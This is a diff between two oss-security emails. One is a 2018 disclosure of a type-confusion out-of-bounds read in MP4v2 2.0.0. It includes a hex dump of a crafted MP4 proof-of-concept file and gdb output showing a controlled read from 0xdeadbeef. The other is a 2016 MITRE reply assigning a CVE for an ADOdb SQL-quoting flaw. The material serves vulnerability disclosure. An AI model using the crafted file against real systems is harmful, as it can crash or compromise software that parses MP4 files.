@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6851" "Wednesday" "18" "July" "2018" "16:30:41" "+0800" "Ruikai Liu" "lrk700@gmail.com" "<CAB6DpjXN5a0iBNVH6ioDd3RC0moCofxN5-QJWxkWZZswUhncbQ@mail.gmail.com>" "184" "[oss-security] Out-of-bounds memory access in MP4v2 2.0.0" nil nil nil "7" "2018071808:30:41" "[oss-security] Out-of-bounds memory access in MP4v2 2.0.0" (number mark "U       lrk700@gmail Jul 18  184/6851  " thread-indent "\"[oss-security] Out-of-bounds memory access in MP4v2 2.0.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2761" "Thursday" "15" "September" "2016" "00:58:24" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160915045824.7C28F8BC36E@smtpvmsrv1.mitre.org>" "64" "[oss-security] Re: ADOdb PDO driver: incorrect quoting may allow SQL injection" "^Cc:" nil nil "9" "2016091504:58:24" "[oss-security] Re: ADOdb PDO driver: incorrect quoting may allow SQL injection" (number mark "        cve-assign@m Sep 15   64/2761  " thread-indent "\"[oss-security] Re: ADOdb PDO driver: incorrect quoting may allow SQL injection\"\n") "<nqpirj$fvm$1@blaine.gmane.org>" ("<nqpirj$fvm$1@blaine.gmane.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 18038 invoked by uid 550); 18 Jul 2018 09:21:40 -0000
+Received: (qmail 11540 invoked by uid 550); 15 Sep 2016 04:58:38 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,222 +11,77 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 11504 invoked from network); 15 Sep 2016 04:58:36 -0000
+In-Reply-To: <nqpirj$fvm$1@blaine.gmane.org>
+Message-Id: <20160915045824.7C28F8BC36E@smtpvmsrv1.mitre.org>
+Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
+Date: Thu, 15 Sep 2016 00:58:24 -0400 (EDT)
+From: cve-assign@mitre.org
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 23745 invoked from network); 18 Jul 2018 08:31:04 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=8Y4nf9wFXQZOBEr16ma08CwSWHJBfbbSv/HPiuVCCA4=;
-        b=QJjAsfkYEMyUgY5js3fvToh9CwRJ9EvA+5FtwBQylfWzuJsnPSW8EnlO1oqR7DHvWQ
-         7VEjHmHtnXLAeF6+8Q6ySdeyG1s6IpnAIlfGebL5/MASypLM0zrdv+5ZJbVoSd0ISqt1
-         DGIebWfrgRxL4gKLC7WJlDBAnVtNVnlyhlWd8e/wdn3/tkXMe5m4TqW0eR01YPQ24kOZ
-         i4hoVqPGwdxv1k2JuXh65SVpbrKbkjYDOnvO1GW06Opz5yE+fgEDr2w5wYh+6zVeSfZ0
-         26esky+oe1zZ8eAGR/E2qzdGlFl2LSw2bYYziL7CpHnIa3gTH57ZpF+qJPj+VvWZ0uh8
-         QNyw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=8Y4nf9wFXQZOBEr16ma08CwSWHJBfbbSv/HPiuVCCA4=;
-        b=RkWGGCpmzXDXJmr5OADGgUWz+BMf52tSjNvb8WEH2XKaFhAXDLlVF7BNarYaFhWvaW
-         yaDkg8vsZC41PcJb68oYIU6JpnlB/bjPSP67LnTlAHnpL7sQF1EITL0NHc1NJLPi7MaS
-         9e0F1KU+8LhTlfe9Q36hJ18TFmpLtsRxbHusrvgSfxIHUluglmAEEsb022KtprFEMwXU
-         tx8c9YbYbHHgX/jpWy2jEL+86E2Qu8lKvjPd7riiophMbW1KAXkpSIRPfyHuzJiplm/n
-         kWabNSs34qOqVaP3vSZg4lUgICE0M3/V5l9EPw3kvu8M5TXmu7XHumdq3ZnoMfvm+mFD
-         9HVw==
-X-Gm-Message-State: AOUpUlHvlSmJIGNtKCbopXVdS6cd0jdZpItpG+Zfe06mzG795UxLjQsP
-	5Tpn0yXjBQk9Zf52+u82RLbcDW186S401OGehVVgAQ==
-X-Google-Smtp-Source: AAOMgpeMs5xZB4djUITahAwTBWN5CL24iaEklzUUaOqSyFA58cRvxDPNLWABXUOFrCGDY7M8VL3sKjfVzFp8s3CryEI=
-X-Received: by 2002:a02:3f25:: with SMTP id d37-v6mr4303300jaa.109.1531902652620;
- Wed, 18 Jul 2018 01:30:52 -0700 (PDT)
-MIME-Version: 1.0
-From: Ruikai Liu <lrk700@gmail.com>
-Date: Wed, 18 Jul 2018 16:30:41 +0800
-Message-ID: <CAB6DpjXN5a0iBNVH6ioDd3RC0moCofxN5-QJWxkWZZswUhncbQ@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset="UTF-8"
-Subject: [oss-security] Out-of-bounds memory access in MP4v2 2.0.0
+Subject: [oss-security] Re: ADOdb PDO driver: incorrect quoting may allow SQL injection
+To: dregad@mantisbt.org
 
-Hi,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-A out-of-bounds memory access bug is found in MP4v2 2.0.0, a legacy
-library dealing with MP4 media file.
+> ADOdb 5.x, qstr() method,
+> improperly quoting strings resulting in a potential SQL injection attack
+> vector.
 
-========= find atom by type =========
+> Note that it is not recommended to write SQL as per the above ...
 
-The function `FindAtom` iterates the atom tree and find the target by
-comparing its type with the given one:
+> https://github.com/ADOdb/ADOdb/issues/226
+> https://github.com/ADOdb/ADOdb/commit/bd9eca9f40220f9918ec3cc7ae9ef422b3e448b8
 
- 316 MP4Atom* MP4Atom::FindChildAtom(const char* name)
- 317 {
- 318     uint32_t atomIndex = 0;
- 319
- 320     // get the index if we have one, e.g. moov.trak[2].mdia...
- 321     (void)MP4NameFirstIndex(name, &atomIndex);
- 322
- 323     // need to get to the index'th child atom of the right type
- 324     for (uint32_t i = 0; i < m_pChildAtoms.Size(); i++) {
- 325         if (MP4NameFirstMatches(m_pChildAtoms[i]->GetType(), name)) {
- ...
+>> SECURITY: ADODB qstr does not quote properly with PDO
 
-However, the comparison could be passed for an crafted atom which
-doesn't match in fact:
+>> labels
+>> security
 
- 29 bool MP4NameFirstMatches(const char* s1, const char* s2)
- 30 {
- 31     if (s1 == NULL || *s1 == '\0' || s2 == NULL || *s2 == '\0') {
- 32         return false;
- 33     }
- 34
- 35     if (*s2 == '*') {
- 36         return true;
- 37     }
- 38
- 39     while (*s1 != '\0') {
- 40         if (*s2 == '\0' || strchr("[.", *s2)) {
- 41             break;
- 42         }
- 43         if (tolower(*s1) != tolower(*s2)) {
- 44             return false;
- 45         }
- 46         s1++;
- 47         s2++;
- 48     }
- 49     return true;
- 50 }
+>>> Should I assume from the silence that no CVE is required for this ?
 
-The above while-loop would exit and return true once `s1` ends early.
-For example, `MP4NameFirstMatches("abc\x00", "abcd")` returns true,
-though an atom with type "abc\x00" should never be returned when
-finding atom of type "abcd".
+It only means that the CVE Team at MITRE is not in an optimal position
+to decide whether a CVE ID should exist for a specific library issue
+that's exploitable only when application code has used that library in
+a "not recommended" way. It's best for a maintainer to suggest what
+outcome they prefer, e.g., "it's not recommended but people still can
+use ADOdb that way; thus, we consider this a required security fix."
 
-Things are different when creating atoms. The 4-bytes type read from
-file is strictly checked to determine which atom constructor to
-use(src/mp4atom.cpp):
+Because "security" is still present in the title and labels of 226,
+we're making the conclusion that this is a security problem and
+assigning an ID, CVE-2016-7405.
 
- 954             if( ATOMID(type) == ATOMID("sdtp") )
- 955                 return new MP4SdtpAtom(file);
+>>>> That's true, but I never did in the past, as this mailing list is (or was?)
+>>>> monitored by mitre, so posting here has been sufficient until now.
 
-The above difference between creating and finding atoms could result
-in type confusion, which leads to out-of-bounds memory access.
+The current situation is that the CVE Team at MITRE receives both the
+oss-security messages and the https://cveform.mitre.org form output.
+We let people choose either method for obtaining a CVE ID from us,
+depending on their disclosure goals, their perspective about open
+pre-assignment discussion, or other factors. People using
+https://cveform.mitre.org are free to forward our replies to
+oss-security if they're relevant to the list, e.g.,
+http://www.openwall.com/lists/oss-security/2016/09/08/14 did this.
 
-========= MP4SdtpAtom =========
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-`FindAtom` is called to find an atom of type "sdtp" when generating
-the track info(src/mp4track.cpp):
-
- 239     // update sdtp log from sdtp atom
- 240     MP4SdtpAtom* sdtp = (MP4SdtpAtom*)m_trakAtom.FindAtom(
-"trak.mdia.minf.stbl.sdtp" );
- 241     if( sdtp ) {
- 242         uint8_t* buffer;
- 243         uint32_t bufsize;
- 244         sdtp->data.GetValue( &buffer, &bufsize );
- 245         m_sdtpLog.assign( (char*)buffer, bufsize );
- 246         free( buffer );
- 247     }
-
-So if a crafted MP4 file contains an atom of type "sdt\x00", then this
-atom would be returned and cast to `MP4SdtpAtom`. But its actual class
-is not `MP4SdtpAtom` since strict comparison is used when creating the
-atom. As a result, `sdtp->data` is actually out of the object.
-
-========= POC =========
-
-We build a MP4 file which contains the necessary fields. The atoms are
-arranged dedicatedly so that for 32-bits program, `sdtp->data` would
-access the trackID, which is controlled by us and would finally leads
-to reading from `0xdeadbeef`:
-
-root@debian:~# xxd c4.mp4
-00000000: 0000 0018 6674 7970 6d70 3432 0000 0000  ....ftypmp42....
-00000010: 6d70 3432 6973 6f6d 0000 01c4 6d6f 6f76  mp42isom....moov
-00000020: 0000 006c 6d76 6864 0000 0000 3030 3030  ...lmvhd....0000
-00000030: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
-00000040: 3030 3030 0000 0000 0000 0000 0000 0000  0000............
-00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
-00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
-00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
-00000080: 0000 0000 0000 0000 0000 0000 0000 0150  ...............P
-00000090: 7472 616b 0000 0060 746b 6864 0000 0001  trak...`tkhd....
-000000a0: 1234 5678 2345 6789 dead bed7 0000 0000  .4Vx#Eg.........
-000000b0: 9876 5432 0000 0000 4141 4141 4141 4141  .vT2....AAAAAAAA
-000000c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
-000000d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
-000000e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
-000000f0: 4141 4141 0000 00e8 6d64 6961 0000 0008  AAAA....mdia....
-00000100: 0565 7374 0000 0020 6864 6c72 4242 4242  .est... hdlrBBBB
-00000110: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
-00000120: 4242 4242 0000 0020 6d64 6864 0000 0000  BBBB... mdhd....
-00000130: 3030 3030 4040 4040 5050 5050 1010 1010  0000@@@@PPPP....
-00000140: 9090 9090 0000 0098 6d69 6e66 0000 0008  ........minf....
-00000150: 0465 7374 0000 0088 7374 626c 0000 0018  .est....stbl....
-00000160: 7374 737a 0000 0000 0000 0000 0000 0000  stsz............
-00000170: 0000 0000 0000 001c 7374 7363 0000 0000  ........stsc....
-00000180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
-00000190: 0000 0010 7374 636f 0000 0000 0000 0000  ....stco........
-000001a0: 0000 0018 7374 7473 0000 0000 0000 0000  ....stts........
-000001b0: 0000 0000 0000 0000 0000 001c 1364 7400  .............dt.
-000001c0: 0000 001c 036f 3634 0000 0000 0000 0008  .....o64........
-000001d0: 7374 7368 0000 0008 7364 7400            stsh....sdt.
-
-Here's the result of running `mp4info` on it:
-
-root@debian:~# gdb /usr/bin/mp4info
-Reading symbols from /usr/bin/mp4info...(no debugging symbols found)...done.
-(gdb) r c4.mp4
-Starting program: /usr/bin/mp4info c4.mp4
-/usr/bin/mp4info version -r
-c4.mp4:
-ReadAtom: "c4.mp4": atom type est is suspect
-ReadAtom: "c4.mp4": atom type est is suspect
-ReadAtom: "c4.mp4": atom type dt is suspect
-ReadAtom: "c4.mp4": atom type sdt is suspect
-ReadChildAtoms: "c4.mp4": In atom stbl missing child atom stsd
-ReadChildAtoms: "c4.mp4": In atom minf missing child atom dinf
-
-Program received signal SIGSEGV, Segmentation fault.
-0xf7ece2c6 in ?? () from /usr/lib/i386-linux-gnu/libmp4v2.so.2
-(gdb) x/i $eip
-=> 0xf7ece2c6:  mov    (%eax),%ecx
-(gdb) i r eax
-eax            0xdeadbeef       -559038737
-
-The binary we test is the i386 mp4v2 package of Debian:
-
-root@debian:~# dpkg -s mp4v2-utils
-Package: mp4v2-utils
-Status: install ok installed
-Priority: optional
-Section: sound
-Installed-Size: 281
-Maintainer: Debian Multimedia Maintainers
-<pkg-multimedia-maintainers@lists.alioth.debian.org>
-Architecture: i386
-Source: mp4v2 (2.0.0~dfsg0-5)
-Version: 2.0.0~dfsg0-5+b1
-Depends: libmp4v2-2 (= 2.0.0~dfsg0-5+b1), libc6 (>= 2.4), libgcc1 (>=
-1:4.2), libstdc++6 (>= 5.2)
-
-========= fix =========
-
-The bug can be fixed by more checks when doing type comparison. For example:
-
---- src/mp4util.cpp     2018-07-18 15:48:12.766709572 +0800
-+++ ../mp4v2-2.0.0-orig/src/mp4util.cpp     2012-05-21 06:11:53.000000000 +0800
-@@ -46,7 +46,6 @@
-         s1++;
-         s2++;
-     }
--    if(*s2 != '[' && *s2 != '.' && *s2 != '\0') return false;
-     return true;
- }
-
-========= Reference =========
-
-[1] https://code.google.com/archive/p/mp4v2/
-[2] http://xhelmboyx.tripod.com/formats/mp4-layout.txt
-
--- 
-Best regards,
-
-Ruikai Liu
+iQIcBAEBCAAGBQJX2indAAoJEHb/MwWLVhi2YqoQAIYLL1M8cHumDhNP7YH3uBaP
+QTsrzO2a2XF51eB4o+bgnht9lLI5eGeOqRdcsT1LfviSH4D/cIRwDTCn3lhykgI0
+bWdypB/Pkni2rlHaiIcxB8T9Qxcy/BI4JGjEv8BTJZ68YfN7I64PXkUKEGXDb5L3
+0t/vOhzILU+9M2nep50LMeehPIVxyvBla7EIhhVN1fiV6cZAaTSb9MfG/0nBC8xo
+EmipAxQmFX6l/5O46cB9jt81rlWdVTt5t3grhlFn0N0VQvHGVX+kW5kYz391wZMS
+bEmDQDQRkvPdJQHEws8lzCGql1eX+cFuiptHLWjMIQZ7FxXQultR+ECVgd6i3q1L
+HjKoHin1x/LqRyWp3pQMnnvqyjV4o/MUpMC5KPZdZalCcFLqenc/pboKugBa2pkT
+weop+fXTS9fadfd9WSgMLCWXWu/OyseszqSGM74JJu1IJXlwa8cb24/GHjIrjvsC
+FZfk5u8xE4zaV+I8y5Dq/pDwSG6nH/AcZT51c44k+vpEl/kXPuhwPEcZTzmnknKw
+S5K9NLksiD0jqogHf595Okt0FopH+86aPwePye1JvmXFBfQf26DCswRg+1/p3g09
+GXYT9leG+v8lFMXf9g3tzL5yq+ENlSKlkFbJq7k1uGdsKUOdMrGhqToWkeJYSp0D
+SNkQDCDU0zfiY/s8xutp
+=Gaft
+-----END PGP SIGNATURE-----
